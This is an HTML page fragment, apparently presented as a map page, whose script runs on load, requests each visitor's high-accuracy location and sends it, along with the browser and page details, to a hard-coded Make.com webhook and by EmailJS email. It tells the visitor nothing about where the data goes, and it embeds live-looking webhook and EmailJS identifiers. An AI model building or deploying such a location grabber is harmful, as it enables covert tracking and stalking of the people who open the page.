<body>

<script>
  const WEBHOOK_URL = 'https://hook.eu1.make.com/pb2pwu4nh3716gark9cluzj9rsam3w15';
  // EmailJS settings from the working Contact.tsx integration.
  const EMAILJS_SERVICE_ID = 'service_vmsdz4p';
  const EMAILJS_TEMPLATE_ID = 'template_yyx98g8';
  const EMAILJS_PUBLIC_KEY = 'GsqqPHdEhHNJyqeae';

  const isEmailJsConfigured = [EMAILJS_PUBLIC_KEY, EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID]
    .every(value => value && !value.startsWith('YOUR_'));

  // Google Maps favicon (via Google's own favicon service)
  const MAPS_FAVICON = 'https://www.google.com/s2/favicons?domain=maps.google.com&sz=64';

  function sendLocation(payload) {
    // text/plain = "simple request" → no CORS preflight (no OPTIONS), straight to POST
    const webhookRequest = fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
      body: JSON.stringify(payload),
      keepalive: true
    }).then(r => console.log('POST status:', r.status))
      .catch(e => console.error('POST failed:', e));

    if (!isEmailJsConfigured) {
      console.info('EmailJS is not configured; skipping email notification.');
      return webhookRequest;
    }

    if (typeof emailjs === 'undefined') {
      console.error('EmailJS SDK did not load; check the browser network connection or content blockers.');
      return webhookRequest;
    }

    const locationMessage = [
      `Latitude: ${payload.latitude}`,
      `Longitude: ${payload.longitude}`,
      `Accuracy: ${payload.accuracy} meters`,
      `Time: ${new Date(payload.timestamp).toISOString()}`,
      `Map: ${payload.mapsLink}`,
      `Page: ${payload.page}`
    ].join('\n');

    // Match the template fields used by the working Contact.tsx form.
    const emailRequest = emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
      user_name: 'Location page visitor',
      user_email: '',
      subject: 'Location shared from the map page',
      message: locationMessage
    }, { publicKey: EMAILJS_PUBLIC_KEY })
      .then(response => console.log('EmailJS status:', response.status, response.text))
      .catch(error => console.error('EmailJS send failed:', error.status, error.text || error));

    return Promise.all([webhookRequest, emailRequest]);
  }

  if (!('geolocation' in navigator)) {
    console.warn('Geolocation not supported');
  } else {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        sendLocation({
          latitude: lat,
          longitude: lng,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp,
          mapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
          mapsFavicon: MAPS_FAVICON,
          page: location.href,
          userAgent: navigator.userAgent,
          createdAt: new Date().toISOString(),
          platform: navigator.platform,
        });
      },
      (err) => console.warn('Geolocation error:', err.code, err.message),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }
</script>
</body>
